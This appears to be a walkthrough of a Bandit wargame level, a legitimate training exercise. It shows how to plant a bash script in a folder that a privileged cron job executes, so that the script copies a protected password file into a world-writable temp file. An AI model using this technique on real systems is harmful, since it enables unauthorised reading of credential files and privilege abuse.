Similar to the previous few levels, in this level we once again have a cron job executing
As with the prior levels we first look at the job cron is executing and then investigate further to find the actual script
Here, we can see that the script is executing all user scripts in a folder and then deleting them
So, we make a directory in the temp directory
mkdir /tmp/mydir
Then in that directory we make a new file
touch exploit.sh
We open this file in vim: vim exploit.sh
Now we edit the file so it contains:

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass.txt

Next we make sure our file is executable
chmod +x exploit.sh
Then we create pass.txt and make sure everyone can write to it
touch pass.txt
chmod 666 pass.txt
Then we copy our exploit script to the directory
cp exploit.sh /var/spool/bandit24/
Then we wait one minute for the script to be run and then open pass.txt for our password
